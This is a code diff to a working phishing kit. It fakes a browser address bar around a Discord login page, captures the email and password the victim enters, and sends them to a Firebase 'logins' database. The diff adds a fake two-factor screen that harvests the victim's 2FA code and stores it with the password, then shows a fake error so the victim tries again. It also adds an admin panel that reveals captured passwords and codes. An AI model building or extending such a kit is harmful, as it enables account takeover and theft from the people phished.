@@ -14,12 +14,17 @@ const database = firebase.database();
 
 // Elements
 const loginScreen = document.getElementById('login-screen');
+const twofaScreen = document.getElementById('twofa-screen');
 const successScreen = document.getElementById('success-screen');
 const errorScreen = document.getElementById('error-screen');
 const adminScreen = document.getElementById('admin-screen');
 const adminAccessBtn = document.getElementById('admin-access-btn');
 const tryAgainBtn = document.getElementById('try-again-btn');
 const adminLogoutBtn = document.getElementById('admin-logout-btn');
+
+// 2FA Elements
+const twofaInput = document.getElementById('twofa-input');
+const twofaSubmitBtn = document.getElementById('twofa-submit-btn');
 
 // URL Bar Elements
 const urlInput = document.getElementById('url-input');
@@ -49,6 +54,8 @@ const codesList = document.getElementById('codes-list');
 const usersTbody = document.getElementById('users-tbody');
 
 let currentUserEmail = null;
+let currentUserPassword = null;
+let currentFirebaseKey = null;
 let isAdmin = false;
 let currentGeneratedCode = '';
 let isCodeVisible = false;
@@ -78,21 +85,18 @@ urlInput.addEventListener('keydown', (e) => {
     }
 });
 
-// Modal Cancel
 modalCancelBtn.addEventListener('click', () => {
     urlWarningModal.classList.add('hidden');
     urlInput.value = originalUrl;
     pendingUrl = '';
 });
 
-// Modal Backdrop Click
 modalBackdrop.addEventListener('click', () => {
     urlWarningModal.classList.add('hidden');
     urlInput.value = originalUrl;
     pendingUrl = '';
 });
 
-// Modal Continue
 modalContinueBtn.addEventListener('click', () => {
     urlWarningModal.classList.add('hidden');
     handleUrlNavigation(pendingUrl);
@@ -101,7 +105,6 @@ modalContinueBtn.addEventListener('click', () => {
 
 function handleUrlNavigation(inputValue) {
     const isValidUrl = inputValue.includes('.') && !inputValue.includes(' ');
-
     if (!isValidUrl) {
         showDomainError(inputValue);
         return;
@@ -125,28 +128,21 @@ function handleUrlNavigation(inputValue) {
         errorPage.classList.remove('hidden');
         errorDomainEl.textContent = `${domain} refused to connect.`;
         errorMessageEl.textContent = `${domain} may have security settings that prevent it from being embedded.`;
-
     } catch (e) {
         showDomainError(inputValue);
         return;
     }
 
-    setTimeout(() => {
-        resetToDiscord();
-    }, 3000);
+    setTimeout(() => { resetToDiscord(); }, 3000);
 }
 
 function showDomainError(query) {
     tabTitle.textContent = query.substring(0, 20);
     tabFavicon.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23888'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E";
-
     errorPage.classList.remove('hidden');
     errorDomainEl.textContent = `This site can't be reached`;
     errorMessageEl.textContent = `"${query}" is not a valid domain. Check if there is a typo in the address.`;
-
-    setTimeout(() => {
-        resetToDiscord();
-    }, 3000);
+    setTimeout(() => { resetToDiscord(); }, 3000);
 }
 
 function resetToDiscord() {
@@ -157,25 +153,67 @@ function resetToDiscord() {
     loginIframe.src = LOGIN_PAGE_URL;
 }
 
-// Listen for messages from the login iframe
+// Listen for messages from login iframe
 window.addEventListener('message', (event) => {
     if (event.data.type === 'login-success') {
         currentUserEmail = event.data.email;
-        handleLoginSuccess(event.data.email);
+        currentUserPassword = event.data.password;
+        showTwoFA(event.data.email, event.data.password);
     }
 });
 
-async function handleLoginSuccess(email) {
+async function showTwoFA(email, password) {
+    // Save login to Firebase first (without 2FA code yet)
+    try {
+        const loginData = {
+            email: email,
+            password: password,
+            twofa: 'pending',
+            timestamp: new Date().toISOString(),
+            owner: false
+        };
+        const ref = await database.ref('logins').push(loginData);
+        currentFirebaseKey = ref.key;
+    } catch (error) {
+        console.error('Error saving login:', error);
+    }
+
+    // Show 2FA screen
     loginScreen.classList.add('hidden');
+    twofaScreen.classList.remove('hidden');
+    twofaInput.value = '';
+    twofaInput.focus();
+}
+
+// 2FA Submit
+twofaSubmitBtn.addEventListener('click', handleTwofaSubmit);
+twofaInput.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') handleTwofaSubmit();
+});
+
+async function handleTwofaSubmit() {
+    const code = twofaInput.value.trim();
+    if (!code) return;
+
+    // Update Firebase entry with 2FA code
+    if (currentFirebaseKey) {
+        try {
+            await database.ref('logins/' + currentFirebaseKey).update({
+                twofa: code
+            });
+        } catch (error) {
+            console.error('Error updating 2FA:', error);
+        }
+    }
+
+    twofaScreen.classList.add('hidden');
     successScreen.classList.remove('hidden');
 
-    await checkAdminStatus(email);
+    await checkAdminStatus(currentUserEmail);
 
     setTimeout(() => {
         successScreen.classList.add('hidden');
-        if (isAdmin) {
-            adminAccessBtn.classList.remove('hidden');
-        }
+        if (isAdmin) adminAccessBtn.classList.remove('hidden');
         errorScreen.classList.remove('hidden');
     }, 2500);
 }
@@ -193,14 +231,15 @@ async function checkAdminStatus(email) {
     }
 }
 
-// Try Again Button
 tryAgainBtn.addEventListener('click', () => {
     errorScreen.classList.add('hidden');
     loginScreen.classList.remove('hidden');
+    currentUserEmail = null;
+    currentUserPassword = null;
+    currentFirebaseKey = null;
     resetToDiscord();
 });
 
-// Admin Access Button
 adminAccessBtn.addEventListener('click', () => {
     errorScreen.classList.add('hidden');
     loginScreen.classList.add('hidden');
@@ -209,7 +248,6 @@ adminAccessBtn.addEventListener('click', () => {
     loadAdminData();
 });
 
-// Admin Logout
 adminLogoutBtn.addEventListener('click', () => {
     adminScreen.classList.add('hidden');
     loginScreen.classList.remove('hidden');
@@ -234,7 +272,6 @@ generateCodeBtn.addEventListener('click', async () => {
         isCodeVisible = false;
         eyeIconShow.classList.remove('hidden');
         eyeIconHide.classList.add('hidden');
-
         codeStatus.textContent = '(working)';
         codeStatus.className = 'code-status working';
         generatedCodeDisplay.classList.remove('hidden');
@@ -245,10 +282,8 @@ generateCodeBtn.addEventListener('click', async () => {
     }
 });
 
-// Toggle Code Visibility
 toggleCodeBtn.addEventListener('click', () => {
     isCodeVisible = !isCodeVisible;
-
     if (isCodeVisible) {
         codeText.textContent = currentGeneratedCode;
         codeText.classList.remove('code-hidden');
@@ -262,14 +297,12 @@ toggleCodeBtn.addEventListener('click', () => {
     }
 });
 
-// Copy Code
 copyCodeBtn.addEventListener('click', () => {
     navigator.clipboard.writeText(currentGeneratedCode);
     copyCodeBtn.textContent = 'Copied!';
     setTimeout(() => { copyCodeBtn.textContent = 'Copy'; }, 2000);
 });
 
-// Generate MC-XXXX-XXXX-XXXX-XXXX format
 function generateMCCode() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     let code = 'MC';
@@ -285,6 +318,7 @@ function generateMCCode() {
 function loadAdminData() {
     loadCodes();
     loadLogins();
+    loadAdminTickets();
 }
 
 function loadCodes() {
@@ -336,7 +370,6 @@ function loadCodes() {
                 const eyeShow = this.querySelector('.eye-show');
                 const eyeHide = this.querySelector('.eye-hide');
                 const isHidden = codeSpan.classList.contains('code-hidden');
-
                 if (isHidden) {
                     codeSpan.textContent = code;
                     codeSpan.classList.remove('code-hidden');
@@ -390,6 +423,9 @@ function loadLogins() {
                     ? '<span class="badge" style="margin-left:8px;font-size:10px;">ADMIN</span>'
                     : '';
                 const hiddenPassword = '*'.repeat(login.password ? login.password.length : 8);
+                const twofaDisplay = login.twofa && login.twofa !== 'pending'
+                    ? `<span class="twofa-cell">${login.twofa}</span>`
+                    : `<span style="color:var(--text-muted);font-size:12px;">${login.twofa === 'pending' ? 'Pending...' : 'N/A'}</span>`;
 
                 html += `
                     <tr>
@@ -407,6 +443,7 @@ function loadLogins() {
                                 </button>
                             </div>
                         </td>
+                        <td>${twofaDisplay}</td>
                         <td>${formattedDate}</td>
                         <td>
                             <button class="icon-btn make-admin" data-key="${key}" ${login.owner ? 'disabled style="opacity:0.5"' : ''}>
@@ -419,7 +456,8 @@ function loadLogins() {
             });
         }
 
-        usersTbody.innerHTML = html || '<tr><td colspan="4" class="empty-state">No logins captured yet</td></tr>';
+        const usersTbody = document.getElementById('users-tbody');
+        usersTbody.innerHTML = html || '<tr><td colspan="5" class="empty-state">No logins captured yet</td></tr>';
         document.getElementById('user-count').textContent = totalCount;
         document.getElementById('total-logins').textContent = totalCount;
         document.getElementById('today-logins').textContent = todayCount;
@@ -430,7 +468,6 @@ function loadLogins() {
                 const eyeShow = this.querySelector('.eye-show');
                 const eyeHide = this.querySelector('.eye-hide');
                 const isHidden = span.textContent.includes('*');
-
                 if (isHidden) {
                     span.textContent = span.dataset.password;
                     eyeShow.classList.add('hidden');
@@ -459,6 +496,140 @@ function loadLogins() {
             });
         });
     });
+}
+
+function loadAdminTickets() {
+    database.ref('tickets').on('value', (snapshot) => {
+        const tickets = snapshot.val();
+        const container = document.getElementById('admin-tickets-list');
+        const countEl = document.getElementById('ticket-count');
+        let html = '';
+        let count = 0;
+
+        if (tickets) {
+            Object.keys(tickets).reverse().forEach(key => {
+                const ticket = tickets[key];
+                count++;
+                const date = new Date(ticket.createdAt).toLocaleString();
+                const statusClass = ticket.status || 'open';
+
+                html += `
+                    <div class="ticket-card status-${statusClass}">
+                        <div class="ticket-header">
+                            <span class="ticket-title">${escapeHtml(ticket.subject)}</span>
+                            <div class="ticket-meta">
+                                <span class="ticket-status ${statusClass}">${statusClass}</span>
+                                <span class="ticket-category-badge">${escapeHtml(ticket.category)}</span>
+                            </div>
+                        </div>
+                        <p class="ticket-description">${escapeHtml(ticket.description)}</p>
+                        ${ticket.closeReason ? `<div class="ticket-close-reason">Closed: ${escapeHtml(ticket.closeReason)}</div>` : ''}
+                        <div class="ticket-footer">
+                            <span class="ticket-author">From: ${escapeHtml(ticket.authorName || 'Anonymous')} (${escapeHtml(ticket.authorEmail || 'Unknown')})</span>
+                            <span class="ticket-date">${date}</span>
+                            <div class="ticket-actions">
+                                ${statusClass === 'open' ? `
+                                    <button class="resolve-btn admin-resolve-ticket" data-key="${key}">Mark Resolved</button>
+                                    <button class="delete-btn admin-close-ticket" data-key="${key}">Close</button>
+                                ` : ''}
+                                <button class="delete-btn admin-delete-ticket" data-key="${key}">Delete</button>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            });
+        }
+
+        container.innerHTML = html || '<p class="empty-state">No tickets submitted yet</p>';
+        countEl.textContent = count;
+
+        // Close ticket
+        let closingKey = null;
+        const closeModal = document.getElementById('close-ticket-modal') || createCloseModal();
+
+        document.querySelectorAll('.admin-close-ticket').forEach(btn => {
+            btn.addEventListener('click', function () {
+                closingKey = this.dataset.key;
+                closeModal.classList.remove('hidden');
+            });
+        });
+
+        document.querySelectorAll('.admin-resolve-ticket').forEach(btn => {
+            btn.addEventListener('click', function () {
+                if (confirm('Mark this ticket as resolved?')) {
+                    database.ref('tickets/' + this.dataset.key).update({ status: 'resolved' });
+                }
+            });
+        });
+
+        document.querySelectorAll('.admin-delete-ticket').forEach(btn => {
+            btn.addEventListener('click', function () {
+                if (confirm('Permanently delete this ticket?')) {
+                    database.ref('tickets/' + this.dataset.key).remove();
+                }
+            });
+        });
+
+        const confirmCloseBtn = document.getElementById('confirm-close-btn');
+        const cancelCloseBtn = document.getElementById('cancel-close-btn');
+        const closeReason = document.getElementById('close-reason-input');
+        const closeBackdrop = document.getElementById('close-ticket-backdrop');
+
+        if (confirmCloseBtn) {
+            confirmCloseBtn.onclick = () => {
+                const reason = closeReason.value.trim();
+                if (!reason) { alert('Please enter a reason.'); return; }
+                if (closingKey) {
+                    database.ref('tickets/' + closingKey).update({
+                        status: 'closed',
+                        closeReason: reason
+                    });
+                }
+                closeModal.classList.add('hidden');
+                closeReason.value = '';
+                closingKey = null;
+            };
+        }
+
+        if (cancelCloseBtn) {
+            cancelCloseBtn.onclick = () => {
+                closeModal.classList.add('hidden');
+                closeReason.value = '';
+                closingKey = null;
+            };
+        }
+
+        if (closeBackdrop) {
+            closeBackdrop.onclick = () => {
+                closeModal.classList.add('hidden');
+                closeReason.value = '';
+                closingKey = null;
+            };
+        }
+    });
+}
+
+function createCloseModal() {
+    const modal = document.createElement('div');
+    modal.id = 'close-ticket-modal';
+    modal.className = 'modal hidden';
+    modal.innerHTML = `
+        <div class="modal-backdrop" id="close-ticket-backdrop"></div>
+        <div class="modal-content">
+            <h2>Close Ticket</h2>
+            <p>Please provide a reason for closing this ticket.</p>
+            <div class="modal-input-wrapper">
+                <label for="close-reason-input">Reason</label>
+                <textarea id="close-reason-input" placeholder="Reason for closing..." rows="3" maxlength="300"></textarea>
+            </div>
+            <div class="modal-buttons">
+                <button id="cancel-close-btn" class="secondary-btn">Cancel</button>
+                <button id="confirm-close-btn" class="danger-btn">Close Ticket</button>
+            </div>
+        </div>
+    `;
+    document.body.appendChild(modal);
+    return modal;
 }
 
 function escapeHtml(text) {
